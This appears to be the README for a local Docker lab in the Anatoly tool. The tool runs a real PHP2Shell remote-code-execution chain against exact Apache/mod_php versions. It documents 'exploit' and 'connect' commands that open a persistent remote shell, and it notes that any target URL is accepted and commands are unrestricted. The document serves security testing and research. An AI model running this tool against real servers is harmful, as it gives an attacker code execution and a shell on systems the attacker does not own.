# Anatoly — Local Docker Exploit & Connect Lab

This optional lab executes the real PHP2Shell chain against an exact **Apache prefork / mod_php** build inside a disposable loopback-only Docker container. It does not simulate command execution and does not infer RCE from a vulnerable version string.

`exploit` and `connect` first reuse Anatoly's normal scanner and its `ScanArgs` options. They select a profile only when the scanner identifies one exact, stable, affected PHP version. The selected profile must match that version; Anatoly never substitutes another patch from the same branch.

## Standalone execution

The `anatoly` executable contains the complete native Rust execution engine, exact build profiles, offsets and heap geometries. At runtime it does **not** invoke Docker or Python and does not read `lab/`, `offsets.py`, `reproducer.py`, a source checkout or a shared `/out` directory. The binary-only installer is therefore sufficient for `scan`, `exploit` and `connect`.

For each command, the engine executes the selected `carrier` or `vessel` geometry and requires fresh output retrieved over HTTP. It creates temporary `p`, `x`, `s` and `o` files beside the target PHP script, fetches them through the same origin and removes them best-effort. Consequently, the target script's directory must be writable by PHP and those proof paths must not already exist. A crash, heap leak or libphp leak alone is never success.

Short commands use the 14-byte carrier directly. Longer or composed commands are encoded, uploaded in bounded chunks, decoded into a temporary script and executed; every stage requires fresh proof. No local proof file or shared filesystem is involved.

Library callers select `Php2ShellProfile::for_version(...)`, construct `Php2ShellBackend::with_profile(profile)` and call `execute(&target, command)`. Terminal output belongs to the caller.

## Verified execution profiles

The embedded catalog contains 18 official `php:<version>-apache` Debian bookworm amd64 profiles with maintainer-verified command proofs from [devploit/php2shell](https://github.com/devploit/php2shell) (MIT, see `lab/PHP2SHELL-LICENSE`):

- PHP **8.4**: 8.4.10, 8.4.11, 8.4.19, 8.4.20, 8.4.25, 8.4.26 (`carrier` geometry);
- PHP **8.5**: every patch from 8.5.0 through 8.5.11 (`vessel` for 8.5.0–8.5.9, `carrier` for 8.5.10–8.5.11).

The 8.4.26 source image is digest-pinned. Other versions use their exact Docker tags. The running PHP version selects the embedded profile; Anatoly does not inspect the container, derive offsets or invoke symbol tools at execution time. A profile mismatch or an unprofiled version aborts execution.

**Affected does not mean RCE-profiled.** PHP 8.2 and 8.3, affected 8.4 patches absent from the list, EOL branches and other build/OS/architecture combinations have no executable profile in this catalog. They can be started for scanner testing, but `exploit`/`connect` refuses them even with `--force`. In particular, PHP 8.3.35 reproduces heap/libphp leaks upstream but has no verified stage-3 profile; Anatoly does not claim RCE for it.

Local end-to-end verification on this checkout covers PHP **8.4.10**, **8.4.26** and **8.5.0**, including both stage-3 geometries, composed commands and execution from a copied binary in an otherwise empty directory. The other embedded profiles retain their upstream verification status rather than a claim of fresh local coverage.

## Architecture

The execution engine is part of the public `anatoly::exploit` library module. Private implementation modules follow the flat `src/exploit_*.rs` layout; the verified profile catalog is compiled into the binary from `src/exploit_profile_catalog.json`. CLI orchestration lives in `execution_modes.rs` and reuses the scanner, target validation, scope validation, export preflight and `Ui`.

Docker and Python are used only to build, start and remove the optional local target. The production CLI never calls them.

## Lab prerequisites

- Docker Desktop (or Docker Engine) running and reachable (`docker version`);
- Python 3.11 or newer, only for the lab lifecycle and verification scripts;
- `linux/amd64` support (native or emulated);
- Sufficient memory for calibrated requests and the 1 GiB container limit.

## Security and isolation guardrails

- Published exclusively on `127.0.0.1:18108`;
- Dedicated Docker bridge network created on `up` and removed on `down`;
- `no-new-privileges:true`, memory limit (`1g`) and PID limit (`64`);
- Any valid absolute HTTP(S) URL is accepted through the shared scanner validation, without lab-specific host, port, path or query restrictions;
- Commands are passed to the shell without an allowlist or denylist;
- PHP and Apache configuration files are mounted read-only; the disposable webroot is writable so HTTP proof files can be created and removed;
- Interactive `connect` uses one target-side `sh` process and preserves its working directory and environment; it provides no TTY or reattachment after closure.

## Walkthrough

### 1. Start an exact supported version

PHP 8.4.26 remains the default:

```powershell
python lab/local_lab.py up
```

Select another version explicitly:

```powershell
python lab/local_lab.py up --php-version 8.5.0
```

The endpoint remains `http://127.0.0.1:18108/index.php` for every version.

### 2. Scan and prove RCE with `exploit`

From source:

```powershell
cargo run -- --no-banner exploit -u http://127.0.0.1:18108/index.php
```

Or use an installed standalone binary from any directory:

```sh
anatoly --no-banner exploit -u http://127.0.0.1:18108/index.php
```

Scanner transport/discovery options keep their usual meaning:

```sh
anatoly --no-banner exploit -u http://127.0.0.1:18108/index.php --samples 1 --no-discover --output proof.json
```

Expected proof fields include:

```text
status               real_rce_proven
php_version          8.5.0
profile              php-8.5.0-bookworm-amd64
calibration          embedded_exact_version_profile_no_runtime_calibration
proof                uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 3. Run shell commands with `connect`

Single command:

```sh
anatoly --no-banner connect -u http://127.0.0.1:18108/index.php --command whoami
```

Composed command:

```sh
anatoly --no-banner connect -u http://127.0.0.1:18108/index.php --command "printf standalone && whoami"
```

Interactive prompt:

```sh
anatoly --no-banner connect -u http://127.0.0.1:18108/index.php
```

The scanner and profile selection run once. A single target-side `sh` process then preserves the working directory, variables and environment between commands. Every command still uses the native chain and requires a fresh completion marker. The prompt displays the current directory.

```text
anatoly:~$ cd /tmp; DEMO=ok
anatoly:/tmp$ pwd; echo $DEMO
/tmp
ok
anatoly:/tmp$ exit
```

Local commands are `help`, `history`, `clear`, `exit` and `quit`. Remote output and nonzero exit statuses are displayed directly. This is a persistent shell, not a TTY: terminal-only interactive programs and reattachment after closure are unsupported. `exit`/`quit`, EOF and normal client teardown close the remote shell and remove its FIFO/output resources.

### 4. Understand `--force`

By default, execution requires a `potentially_affected` scan verdict. If the scanner identifies an exact stable affected version and a verified profile but the overall HTTP verdict is inconclusive, `--force` permits the attempt:

```sh
anatoly --no-banner exploit -u http://127.0.0.1:18108/index.php --force
```

`--force` **never** bypasses target or command restrictions and never permits an unknown, conflicting, fixed, prerelease, unsupported or unreviewed version. It also cannot manufacture a missing RCE profile or select another build.

### 5. Stop and remove the lab

```powershell
python lab/local_lab.py down
```

## Automated verification

Run unit and CLI guardrail tests without Docker:

```powershell
cargo test --locked
```

Run the real end-to-end flow. The script builds Anatoly, starts the selected container, copies only the executable into a temporary directory and runs `exploit` and `connect --command whoami` from there before teardown. `--composed` additionally verifies the multi-stage composed-command transport. `--persistent` verifies that cwd and a variable survive into a second interactive command and that the session closes cleanly:

```powershell
python scripts/verify_local_lab.py --php-version 8.4.26 --composed --persistent
python scripts/verify_local_lab.py --php-version 8.4.10
python scripts/verify_local_lab.py --php-version 8.5.0
```

## Troubleshooting

- **Docker CLI not found / daemon unavailable**: needed only to start the optional target. Start Docker Desktop and open a new terminal if it was just installed.
- **No verified RCE profile**: the detected version has no embedded stage-3 geometry. Do not substitute a nearby profile; `--force` intentionally does not override this refusal.
- **Proof path already exists**: Anatoly refuses to overwrite pre-existing `p`, `x`, `s` or `o` resources beside the target script. Use a clean disposable target directory.
- **No fresh HTTP proof**: confirm that PHP can write beside the target script and that the same origin serves those files. A blind memory-corruption attempt is never reported as success.
- **HEAP_LEAK_FAILED / LIBPHP_LEAK_FAILED**: recreate the container with `down` then `up` and retry within the calibrated retry budget.
